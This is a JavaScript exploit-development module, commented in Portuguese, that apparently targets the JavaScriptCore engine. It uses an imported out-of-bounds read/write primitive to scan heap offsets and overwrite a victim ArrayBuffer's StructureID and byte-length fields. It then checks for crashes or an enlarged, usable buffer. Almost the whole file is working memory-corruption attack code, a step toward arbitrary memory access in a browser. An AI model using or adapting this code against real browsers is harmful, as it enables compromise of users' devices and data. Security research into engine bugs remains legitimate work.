// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// Função para verificar o ArrayBuffer vítima após uma tentativa de corrupção
async function checkVictimABAfterCorruption(victim_ab, originalSize, corruptedField, valueUsedForCorruption, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB vítima (size original: ${toHex(originalSize)}) após tentativa de corrupção do campo '${corruptedField}' com valor ${toHex(valueUsedForCorruption)}...`, "info", FNAME_PARENT);
    let accessError = null;
    let currentByteLength = -1;
    let observedBehavior = "Nenhum erro/crash óbvio no acesso.";

    try {
        // Tentativa primária: Ler o byteLength. Isso pode falhar se o StructureID estiver muito corrompido.
        currentByteLength = victim_ab.byteLength;
        logFn(`    victim_ab.byteLength atual: ${toHex(currentByteLength)}`, "info", FNAME_PARENT);

        if (corruptedField === "StructureID" && currentByteLength !== originalSize) {
            observedBehavior = `StructureID corrompido, byteLength mudou para ${toHex(currentByteLength)} (esperado ${toHex(originalSize)}).`;
            logFn(`    ${observedBehavior}`, "warn", FNAME_PARENT);
            // Mesmo que o tamanho mude, um StructureID inválido pode causar crash ao tentar usar o buffer.
        } else if (corruptedField === "size" && currentByteLength === valueUsedForCorruption) {
            observedBehavior = `SUCESSO NA CORRUPÇÃO DE TAMANHO: victim_ab.byteLength é ${toHex(currentByteLength)}!`;
            logFn(`    ---> ${observedBehavior}`, "vuln", FNAME_PARENT);
            // Tentar uma operação que usaria o novo tamanho
            try {
                const dv = new DataView(victim_ab);
                if (currentByteLength > 0) {
                    dv.getUint8(currentByteLength - 1); // Acessa o final do buffer (novo tamanho)
                    observedBehavior += " DataView conseguiu usar o novo tamanho.";
                    logFn(`    ---> ${observedBehavior}`, "critical", FNAME_PARENT);
                    return true; // Corrupção de tamanho bem-sucedida e utilizável
                }
            } catch (e_dv) {
                observedBehavior = `ERRO ao usar DataView com novo tamanho ${toHex(currentByteLength)}: ${e_dv.message}.`;
                logFn(`    ---> ${observedBehavior} POTENCIAL CRASH/UAF!`, "critical", FNAME_PARENT);
                return true; // Consideramos um erro aqui como um "sucesso" na desestabilização
            }
        } else if (corruptedField === "size" && currentByteLength !== originalSize) {
            observedBehavior = `AVISO: victim_ab.byteLength (${toHex(currentByteLength)}) mudou, mas não para o valor esperado (${toHex(valueUsedForCorruption)}).`;
            logFn(`    ${observedBehavior}`, "warn", FNAME_PARENT);
        }

        // Tentativa secundária: Criar um DataView. Isso testa a validade do ponteiro de dados e do tamanho.
        // Se o StructureID estiver corrompido, isso pode falhar antes mesmo de verificar o ponteiro de dados.
        logFn(`    Tentando criar new DataView(victim_ab)...`, "info", FNAME_PARENT);
        new DataView(victim_ab);
        logFn(`    new DataView(victim_ab) bem-sucedido. ${observedBehavior}`, "info", FNAME_PARENT);

    } catch (e) {
        accessError = e;
        observedBehavior = `ERRO AO ACESSAR VICTIM_AB APÓS CORRUPÇÃO DE '${corruptedField}': ${e.name} - ${e.message}.`;
        logFn(`    ---> ${observedBehavior} POTENCIAL CRASH/UAF!`, "critical", FNAME_PARENT);
        console.error(`Erro ao acessar victim_ab (campo '${corruptedField}', valor ${toHex(valueUsedForCorruption)}):`, e);
        return true; // Sinaliza que um crash/erro de acesso ocorreu
    }
    
    // Se uma corrupção de tamanho levou ao valor esperado e foi utilizável, já retornou true.
    // Se um erro de acesso ocorreu, já retornou true.
    // Se chegamos aqui, a corrupção não causou um erro de acesso imediato e direto.
    if (corruptedField === "StructureID" && currentByteLength === originalSize) {
         logFn(`    Corrupção de StructureID não alterou byteLength nem causou erro de acesso imediato.`, "good", FNAME_PARENT);
    }
    return false; // Nenhuma detecção de crash/erro óbvio ou corrupção útil de tamanho.
}

const LONG_PAUSE_S3_AB_CORRUPT = 1000;

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure_FocusedCrash";

    // Valores de corrupção para StructureID e Size
    // Inclui valores que podem ser problemáticos ou IDs de outros tipos (placeholders)
    const corruptionValuesForStructureID = [
        0xFFFFFFFF, 0x00000000, 0x00000001, 0x41414141,
        parseInt(KNOWN_STRUCTURE_IDS.TYPE_JS_FUNCTION, 16) || 0x0A0000AA, // Usa placeholder se não definido
        parseInt(KNOWN_STRUCTURE_IDS.TYPE_JS_OBJECT_GENERIC, 16) || 0x010000AA,
    ].filter((v, i, a) => a.indexOf(v) === i && !isNaN(v)); // Remove duplicatas e NaN

    const corruptionValuesForSize = [
        0x7FFFFFFF, // Tamanho máximo (positivo)
        0xFFFFFFFF, // Tamanho negativo ou muito grande (pode ser interpretado como -1 ou um valor alto dependendo da arquitetura)
        0x00000000, // Tamanho zero
        0x00000001, // Tamanho um
    ].filter((v, i, a) => a.indexOf(v) === i && !isNaN(v));


    const CORRUPTION_AB_CONFIG = {
        victim_ab_size: 256,
        // Offsets relativos ao início do objeto JSArrayBuffer (baseCandidateOffsetForVictimAB)
        structure_id_field_offset: parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16), // Normalmente 0x00
        size_field_offset: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16), // Normalmente 0x30

        // Estes são offsets ABSOLUTOS dentro de oob_array_buffer_real para a busca
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 128,
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - 256,
        search_step: 8,
        
        max_crash_detections: 1,
        attempts: 1,
    };

    logS3(`--- Teste Focado (Crash) de Corrupção de Estrutura de AB (S3) (v2.8) ---`, "test", FNAME);
    logS3(`   Config: victim_size=${CORRUPTION_AB_CONFIG.victim_ab_size}B`, "info", FNAME);
    logS3(`   StructureID Offset (relativo ao obj): ${toHex(CORRUPTION_AB_CONFIG.structure_id_field_offset)}`, "info", FNAME);
    logS3(`   Size Offset (relativo ao obj): ${toHex(CORRUPTION_AB_CONFIG.size_field_offset)}`, "info", FNAME);
    logS3(`   Procurando por metadados do AB vítima entre ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} e ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)} no buffer OOB.`, "info", FNAME);

    let crashDetections = 0;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        let victim_ab;
        try {
            victim_ab = new ArrayBuffer(CORRUPTION_AB_CONFIG.victim_ab_size);
            logS3(`ArrayBuffer vítima de ${CORRUPTION_AB_CONFIG.victim_ab_size} bytes criado.`, "info", FNAME);
        } catch (e) {
            logS3(`Falha ao criar ArrayBuffer vítima: ${e.message}. Abortando tentativa.`, "error", FNAME);
            clearOOBEnvironment();
            continue;
        }
        const originalVictimSize = CORRUPTION_AB_CONFIG.victim_ab_size;
        await PAUSE_S3(SHORT_PAUSE_S3);

        for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffsetForVictimAB < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffsetForVictimAB += CORRUPTION_AB_CONFIG.search_step) {

            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

            if (baseCandidateOffsetForVictimAB < 0 || 
                baseCandidateOffsetForVictimAB + Math.max(CORRUPTION_AB_CONFIG.structure_id_field_offset + 4, CORRUPTION_AB_CONFIG.size_field_offset + 4) > oob_array_buffer_real.byteLength) {
                continue; 
            }

            logS3(` Testando offset base para metadados do AB vítima: ${toHex(baseCandidateOffsetForVictimAB)}`, "subtest", FNAME);

            // --- TENTATIVA DE CORROMPER STRUCTUREID ---
            const absOffsetForVictimStructureIDField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.structure_id_field_offset;
            let originalValueAtStructureIDOffset = null;

            for (const valueToTry of corruptionValuesForStructureID) {
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                logS3(`  Tentando corromper STRUCTURE_ID em ${toHex(absOffsetForVictimStructureIDField)} para ${toHex(valueToTry)}`, "info", FNAME);
                try {
                    originalValueAtStructureIDOffset = oob_read_absolute(absOffsetForVictimStructureIDField, 4);
                    // logS3(`   Valor original (StructureID): ${toHex(originalValueAtStructureIDOffset)}`, "info", FNAME); // Log pode ser verboso
                    oob_write_absolute(absOffsetForVictimStructureIDField, valueToTry, 4);

                    if (await checkVictimABAfterCorruption(victim_ab, originalVictimSize, "StructureID", valueToTry, logS3, FNAME)) {
                        crashDetections++;
                        logS3(`    !!! DETECÇÃO DE CRASH/ERRO APÓS CORRUPÇÃO DE STRUCTURE_ID (Offset Base ${toHex(baseCandidateOffsetForVictimAB)}, Valor ${toHex(valueToTry)}) !!!`, "critical", FNAME);
                        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                    }
                } catch (e_write_sid) {
                    logS3(`   Falha na leitura/escrita OOB para StructureID em ${toHex(absOffsetForVictimStructureIDField)}: ${e_write_sid.message}`, "warn", FNAME);
                } finally {
                    if (originalValueAtStructureIDOffset !== null) {
                        try { oob_write_absolute(absOffsetForVictimStructureIDField, originalValueAtStructureIDOffset, 4); } catch (e_restore) { /* silencioso */ }
                    }
                }
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                await PAUSE_S3(SHORT_PAUSE_S3 / 4);
            }
            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;


            // --- TENTATIVA DE CORROMPER O CAMPO DE TAMANHO ---
            const absOffsetForVictimSizeField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.size_field_offset;
            let originalValueAtSizeOffset = null;
            
            for (const valueToTry of corruptionValuesForSize) {
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                logS3(`  Tentando corromper TAMANHO em ${toHex(absOffsetForVictimSizeField)} para ${toHex(valueToTry)}`, "info", FNAME);
                try {
                    originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSizeField, 4);
                    // logS3(`   Valor original (tamanho): ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                    oob_write_absolute(absOffsetForVictimSizeField, valueToTry, 4);

                    if (await checkVictimABAfterCorruption(victim_ab, originalVictimSize, "size", valueToTry, logS3, FNAME)) {
                        crashDetections++;
                        logS3(`    !!! DETECÇÃO DE CRASH/ERRO APÓS CORRUPÇÃO DE TAMANHO (Offset Base ${toHex(baseCandidateOffsetForVictimAB)}, Valor ${toHex(valueToTry)}) !!!`, "critical", FNAME);
                        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                    }
                } catch (e_write_size) {
                    logS3(`   Falha na leitura/escrita OOB para o campo de tamanho em ${toHex(absOffsetForVictimSizeField)}: ${e_write_size.message}`, "warn", FNAME);
                } finally {
                    if (originalValueAtSizeOffset !== null) {
                        try { oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4); } catch (e_restore) { /* silencioso */ }
                    }
                }
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                await PAUSE_S3(SHORT_PAUSE_S3 / 4);
            }
            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

            if (baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 20) === 0) {
                 await PAUSE_S3(MEDIUM_PAUSE_S3 / 2); // Pausa menor entre blocos de busca
            }
        } // Fim do loop de baseCandidateOffsetForVictimAB

        clearOOBEnvironment();
        victim_ab = null; 
        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3_AB_CORRUPT);
    }

    logS3(`--- Teste Focado (Crash) de Corrupção de Estrutura de AB Concluído (Detecções de Crash/Erro: ${crashDetections}) ---`, "test", FNAME);
}
